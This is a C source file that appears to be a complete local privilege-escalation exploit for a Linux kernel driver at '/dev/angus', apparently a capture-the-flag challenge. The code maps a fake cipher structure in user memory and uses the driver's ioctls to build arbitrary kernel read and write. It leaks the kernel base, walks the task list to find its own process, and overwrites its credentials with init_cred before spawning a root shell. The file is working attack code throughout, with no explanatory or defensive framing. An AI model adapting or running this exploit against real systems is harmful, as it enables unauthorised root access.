#include "libpwn.c"

#define DEVICE "/dev/angus"

#define COMM_RELATIVE_OFFSET 0x2d0 // relative from task_list
#define CREDS_RELATIVE_OFFSET 0x2c0 // relative from task_list
#define INIT_TASK_TASK_LIST_OFFSET 0xe12870 // init_task->task_list
#define BUFFER_SIZE 0x200

#define CMD_INIT    0x13370001
#define CMD_SETKEY  0x13370002
#define CMD_SETDATA 0x13370003
#define CMD_GETDATA 0x13370004
#define CMD_ENCRYPT 0x13370005
#define CMD_DECRYPT 0x13370006

typedef struct {
  char *key;
  char *data;
  size_t keylen;
  size_t datalen;
} XorCipher;

typedef struct {
  char *ptr;
  size_t len;
} request_t;

char key[0x8] = {0x0};
char buffer[BUFFER_SIZE];
XorCipher *fake;
int fd;

void angus_init() {
    request_t dummy = {
        .ptr = NULL,
        .len = 0
    };
    if(ioctl(fd, CMD_INIT, &dummy) < 0) {
        panic("ioctl: CMD_INIT");
    }
}

void angus_getdata(char *buffer, u64 len) {
    request_t req = {
        .ptr = buffer,
        .len = len
    };
    if(ioctl(fd, CMD_GETDATA, &req) < 0) {
        panic("ioctl: CMD_GETDATA");
    }
}

void angus_encrypt() {
    request_t dummy = {
        .ptr = NULL,
        .len = 0
    };
    if(ioctl(fd, CMD_ENCRYPT, &dummy) < 0) {
        panic("ioctl: CMD_ENCRYPT");
    }
}

void arb_read(u64 where, u64 size) {
    fake->data = (char*)where;
    fake->datalen = size;
    angus_getdata(buffer, fake->datalen);
}

u64 u64_arb_read(u64 where) {
    arb_read(where, 8);
    return ((u64*)buffer)[0];
}

void u64_arb_write(u64 where, u64 what) {
    printf("[ARB WRITE] 0x%lx = 0x%lx\n", where, what);
    u64 original_data = u64_arb_read(where);
    *((u64*)key) = (original_data ^ what);

    fake->data = (char*)where;
    fake->datalen = 8;
    fake->key = (char*)&key; // X ^ 0x0 = X
    fake->keylen = sizeof(key);

    angus_encrypt();
}

int main() {
    fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        panic("open");
    }

    fake = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1 , 0 );
    if (fake == MAP_FAILED) {
        panic("mmap");
    }

    arb_read(CPU_ENTRY_AREA+0x4, 0x8);
    kbase = ((u64*)buffer)[0] - 0x808e00;
    validate_kbase();

    if (prctl(PR_SET_NAME, "ARGONAUT", 0, 0, 0) != 0) {
        panic("prctl");
    }

    u64 init_task_task_list = kbase + INIT_TASK_TASK_LIST_OFFSET;
    info2("init_task->task_list", init_task_task_list);

    u64 init_cred = u64_arb_read(init_task_task_list+CREDS_RELATIVE_OFFSET);
    info2("init_cred", init_cred);

    u64 current = init_task_task_list;

    char comm[0x10];
    u64 i = 0;
    while(current != 0) {
        arb_read(current+COMM_RELATIVE_OFFSET, 0x10);
        memcpy(comm, buffer, 0x10);
        printf("[ARB READ] task[%d] [%s]: 0x%lx\n", i, comm, current);

        if (strcmp(comm, "ARGONAUT") == 0) {
            _pause_("Found ARGONAUT task");
            break;
        }

        current = u64_arb_read(current);
        i++;
    }

    u64_arb_write(current+CREDS_RELATIVE_OFFSET, init_cred);
    u64_arb_write(current+CREDS_RELATIVE_OFFSET+8, init_cred);

    spawn_shell();

    _pause_("end of exploit...");
}